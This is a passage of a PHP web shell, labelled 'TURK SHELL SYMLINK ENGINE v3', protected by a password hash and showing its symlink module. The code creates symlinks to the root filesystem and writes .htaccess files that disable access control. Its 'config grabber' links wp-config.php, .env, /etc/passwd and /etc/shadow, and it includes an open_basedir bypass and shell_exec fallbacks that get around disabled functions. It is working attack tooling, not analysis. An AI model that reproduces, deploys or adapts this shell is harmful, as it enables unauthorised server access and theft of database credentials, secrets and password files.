...
$auth_hash='$2a$12$t7GJmM/m6TKeIwj6vYHCfuCw71FqzAvIN2kx8h6syj0.7I8FYbAhG';
...
$act=$_POST['symlink_action'];$target=isset($_POST['sym_target'])?$_POST['sym_target']:'/';$link_name=isset($_POST['sym_name'])?safeName($_POST['sym_name']):'root';
if($act==='basic'){$link_path=$dir.'/'.$link_name;if(!file_exists($link_path)){if(@symlink($target,$link_path)){$sym_msg='<span style="color:var(--g)">[+] SYMLINK CREATED: '.htmlspecialchars($link_name).' → '.htmlspecialchars($target).'</span>';}else{$sym_msg='<span style="color:var(--r)">[-] FAILED create symlink</span>';}}else{$sym_msg='<span style="color:var(--o)">[!] Symlink name exists</span>';}}
elseif($act==='root'){$sym_dir='sym_root';$sym_path=$dir.'/'.$sym_dir;$link_path=$sym_path.'/'.$link_name;@mkdir($sym_path,0777);@file_put_contents($sym_path.'/.htaccess',"Options All\nDirectoryIndex sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any\n");if(!file_exists($link_path)){if(@symlink($target,$link_path)){$sym_msg='<span style="color:var(--g)">[+] ROOT SYMLINK: '.$sym_dir.'/'.$link_name.' → '.htmlspecialchars($target).'<br>🔗 <a href="'.$sym_dir.'/'.$link_name.'" target="_blank" style="color:var(--c);text-shadow:0 0 8px var(--c)">OPEN SYMLINK</a></span>';}else{$sym_msg='<span style="color:var(--r)">[-] Root symlink failed. Trying open_basedir bypass method...</span>';}}else{$sym_msg='<span style="color:var(--o)">[!] Symlink already exists</span>';}}
elseif($act==='config'){$cfg_dir='sym_config';$cfg_path=$dir.'/'.$cfg_dir;@mkdir($cfg_path,0777);@file_put_contents($cfg_path.'/.htaccess',"Options All\nDirectoryIndex sux.html\nAddType text/plain .php\nAddHandler txt .php\nRequire None\nSatisfy Any\n");$config_files=array('wp-config.php'=>'/wp-config.php','configuration.php'=>'/configuration.php','.env'=>'/.env','config.php'=>'/config.php','database.php'=>'/database.php','db_config.php'=>'/db_config.php','.htaccess'=>'/.htaccess','passwd'=>'/etc/passwd','shadow'=>'/etc/shadow');$made=0;foreach($config_files as $display=>$cfg_target){$cfg_link=$cfg_path.'/'.$display;if(!file_exists($cfg_link)){$found=false;$search_paths=array($dir.$cfg_target,dirname($dir).$cfg_target,$_SERVER['DOCUMENT_ROOT'].$cfg_target,$cfg_target);foreach($search_paths as $sp){if(file_exists($sp)){if(@symlink($sp,$cfg_link)){$made++;$found=true;}break;}}if(!$found){@symlink($cfg_target,$cfg_link);}}}$sym_msg='<span style="color:var(--g)">[+] CONFIG GRABBER: '.$made.' symlinks created in <strong>'.$cfg_dir.'/</strong><br>🔗 <a href="?d='.urlencode($dir.'/'.$cfg_dir).'" style="color:var(--c);text-shadow:0 0 8px var(--c)">BROWSE CONFIG DIR</a></span>';}
elseif($act==='bypass'){$by_dir='bypass_link';$by_path=$dir.'/'.$by_dir;@mkdir($by_path,0777);$fakedir='cx';$fakedep=16;$num=0;$file_param=$target;if(!file_exists($by_path.'/'.$fakedir)){@mkdir($by_path.'/'.$fakedir,0777);}$ch=$by_path.'/'.$fakedir;for($i=0;$i<$fakedep;$i++){@mkdir($ch.'/'.$fakedir,0777);$ch.='/'.$fakedir;}@symlink(str_repeat($fakedir."/",$fakedep),$by_path.'/fakesymlink');$sx='';while(true){if(@symlink($by_path.'/fakesymlink/'.str_repeat("../",$fakedep-1).$file_param,$by_path.'/symlink'.$num)){$sx='symlink'.$num;break;}else{$num++;if($num>50){$sx='';break;}}}@unlink($by_path.'/fakesymlink');@mkdir($by_path.'/fakesymlink');if($sx){@file_put_contents($by_path.'/.htaccess',"Options All\nDirectoryIndex sux.html\nAddType text/plain .php\nAddHandler txt .php\nRequire None\nSatisfy Any\n");$sym_msg='<span style="color:var(--g)">[+] OPEN_BASEDIR BYPASS SUCCESS<br>🔗 <a href="'.$by_dir.'/'.$sx.'" target="_blank" style="color:var(--c);text-shadow:0 0 8px var(--c)">OPEN: '.$by_dir.'/'.$sx.' → '.htmlspecialchars($file_param).'</a></span>';}else{$sym_msg='<span style="color:var(--r)">[-] Bypass failed</span>';}}
elseif($act==='manual_exec'){$exe_target=$_POST['sym_target'];$exe_name=safeName($_POST['sym_name']);$exe_path=$dir.'/'.$exe_name;if(!empty($exe_target)&&!empty($exe_name)){$cmd='ln -s '.escapeshellarg($exe_target).' '.escapeshellarg($exe_path).' 2>&1';$output=@shell_exec($cmd);if(file_exists($exe_path)){$sym_msg='<span style="color:var(--g)">[+] LN -S SUCCESS: <strong>'.$exe_name.'</strong> → '.htmlspecialchars($exe_target).'</span>';}else{$sym_msg='<span style="color:var(--r)">[-] FAILED manual symlink. Output: '.htmlspecialchars($output).'</span>';}}}
elseif($act==='cleanup'){$removed=0;foreach(array('sym_root','sym_config','bypass_link') as $sd){$sp=$dir.'/'.$sd;if(is_dir($sp)){$fi=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($fi as $f){if($f->isLink()||$f->isFile()){@unlink($f->getPathname());$removed++;}elseif($f->isDir()){@rmdir($f->getPathname());}}@rmdir($sp);}}$sym_msg='<span style="color:var(--o)">[-] CLEANUP: '.$removed.' items removed</span>';}
}
?>
<div><h2 style="color:var(--m);text-align:center;text-shadow:0 0 12px var(--m),0 0 24px rgba(255,0,255,0.2);margin:0 0 12px;font-size:18px">[ TURK SHELL SYMLINK ENGINE v3 ]</h2>
<?php if($sym_msg){echo '<div class="console" style="border-top-color:var(--m);font-size:12px;padding:12px">'.$sym_msg.'</div>';} ?>
<div class="tools" style="grid-template-columns:repeat(auto-fit,minmax(240px,1fr))">
<div class="tb" style="border-left:4px solid var(--c);padding:14px"><h3 style="color:var(--c);margin:0 0 10px;text-shadow:0 0 6px var(--c);font-size:13px">◉ BASIC SYMLINK</h3><form method="post"><input type="hidden" name="symlink_action" value="basic"><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Target path:</label><input type="text" name="sym_target" value="/" style="border-color:var(--c);font-size:12px"></div><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Link name:</label><input type="text" name="sym_name" value="root_link" style="border-color:var(--c);font-size:12px"></div><button type="submit" style="border:2px solid var(--c);color:var(--c);background:transparent;padding:8px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--c)">[ CREATE BASIC ]</button></form></div>
<div class="tb" style="border-left:4px solid var(--p2);padding:14px"><h3 style="color:var(--p2);margin:0 0 10px;text-shadow:0 0 6px var(--p2);font-size:13px">◉ ROOT + .HTACCESS BYPASS</h3><form method="post"><input type="hidden" name="symlink_action" value="root"><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Target (default: /root):</label><input type="text" name="sym_target" value="/" style="border-color:var(--p2);font-size:12px"></div><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Link name:</label><input type="text" name="sym_name" value="root" style="border-color:var(--p2);font-size:12px"></div><button type="submit" style="border:2px solid var(--p2);color:var(--p2);background:transparent;padding:8px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--p2)">[ ROOT + BYPASS ]</button></form><div style="color:var(--t3);font-size:10px;margin-top:6px;border-top:1px dashed rgba(138,43,226,0.2);padding-top:6px">Creates dir <strong style="color:var(--c)">sym_root/</strong> with .htaccess bypass + FollowSymLinks + symlink to target</div></div>
<div class="tb" style="border-left:4px solid var(--g);padding:14px"><h3 style="color:var(--g);margin:0 0 10px;text-shadow:0 0 6px var(--g);font-size:13px">◉ CONFIG GRABBER</h3><form method="post"><input type="hidden" name="symlink_action" value="config"><button type="submit" style="border:2px solid var(--g);color:var(--g);background:transparent;padding:12px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--g)">[ AUTO GRAB CONFIGS ]</button></form><div style="color:var(--t3);font-size:10px;margin-top:8px;border-top:1px dashed rgba(0,255,136,0.2);padding-top:6px">Creates <strong style="color:var(--g)">sym_config/</strong> with symlinks to:<br>wp-config.php · configuration.php · .env · config.php<br>database.php · .htaccess · /etc/passwd · /etc/shadow</div></div>
<div class="tb" style="border-left:4px solid var(--y);padding:14px"><h3 style="color:var(--y);margin:0 0 10px;text-shadow:0 0 6px var(--y);font-size:13px">◉ OPEN_BASEDIR BYPASS</h3><form method="post"><input type="hidden" name="symlink_action" value="bypass"><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Target file to read:</label><input type="text" name="sym_target" value="/etc/passwd" style="border-color:var(--y);font-size:12px"></div><button type="submit" style="border:2px solid var(--y);color:var(--y);background:transparent;padding:8px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--y)">[ BYPASS + READ ]</button></form><div style="color:var(--t3);font-size:10px;margin-top:6px;border-top:1px dashed rgba(255,215,0,0.2);padding-top:6px">Creates <strong style="color:var(--y)">bypass_link/</strong> with deep symlink chain to bypass open_basedir (PHP 5.x method)</div></div>
<div class="tb" style="border-left:4px solid var(--o);padding:14px"><h3 style="color:var(--o);margin:0 0 10px;text-shadow:0 0 6px var(--o);font-size:13px">◉ MANUAL LN -S (via exec)</h3><form method="post" action="?d=<?php echo urlencode($dir); ?>&mode=symlink"><input type="hidden" name="symlink_action" value="manual_exec"><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Target:</label><input type="text" name="sym_target" value="/home" style="border-color:var(--o);font-size:12px"></div><div style="margin-bottom:6px"><label style="color:var(--t2);font-size:11px">Link name:</label><input type="text" name="sym_name" value="home_link" style="border-color:var(--o);font-size:12px"></div><button type="submit" style="border:2px solid var(--o);color:var(--o);background:transparent;padding:8px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--o)">[ EXEC LN -S ]</button></form><div style="color:var(--t3);font-size:10px;margin-top:6px;border-top:1px dashed rgba(255,102,0,0.2);padding-top:6px">Uses shell_exec("ln -s ...") — bypasses disabled symlink() function</div></div>
<div class="tb" style="border-left:4px solid var(--r);padding:14px"><h3 style="color:var(--r);margin:0 0 10px;text-shadow:0 0 6px var(--r);font-size:13px">◉ CLEANUP SYMLINK DIRS</h3><form method="post"><input type="hidden" name="symlink_action" value="cleanup"><button type="submit" onclick="return confirm('Hapus semua symlink directory (sym_root, sym_config, bypass_link)?')" style="border:2px solid var(--r);color:var(--r);background:transparent;padding:12px;cursor:pointer;font-weight:700;width:100%;border-radius:4px;font-family:inherit;box-shadow:0 0 6px var(--r)">[ REMOVE ALL ]</button></form><div style="color:var(--t3);font-size:10px;margin-top:6px;border-top:1px dashed rgba(255,20,147,0.2);padding-top:6px">Deletes <strong style="color:var(--r)">sym_root/</strong>, <strong style="color:var(--r)">sym_config/</strong>, <strong style="color:var(--r)">bypass_link/</strong> and their contents</div></div>
</div>
<div style="margin-top:14px;border:1px dashed rgba(255,0,255,0.2);padding:12px;border-radius:6px;background:rgba(0,229,255,0.01)"><table style="font-size:11px;width:100%"><tr><td style="color:var(--t3);width:120px;border:none;padding:4px">WORKING DIR:</td><td style="color:var(--c);border:none;padding:4px"><?php echo htmlspecialchars($dir); ?></td></tr><tr><td style="color:var(--t3);border:none;padding:4px">PHP SYMLINK():</td><td style="border:none;padding:4px;color:<?php echo function_exists('symlink')?'var(--g)':'var(--r)'; ?>"><?php echo function_exists('symlink')?'AVAILABLE':'DISABLED'; ?></td></tr><tr><td style="color:var(--t3);border:none;padding:4px">EXEC/SHELL:</td><td style="border:none;padding:4px;color:<?php echo (function_exists('exec')||function_exists('shell_exec'))?'var(--g)':'var(--r)'; ?>"><?php echo (function_exists('exec')||function_exists('shell_exec'))?'AVAILABLE':'DISABLED'; ?></td></tr><tr><td style="color:var(--t3);border:none;padding:4px">DISABLE FUNCTIONS:</td><td style="border:none;padding:4px;color:var(--y);word-break:break-all"><?php echo htmlspecialchars($dis_func); ?></td></tr></table></div>
</div>
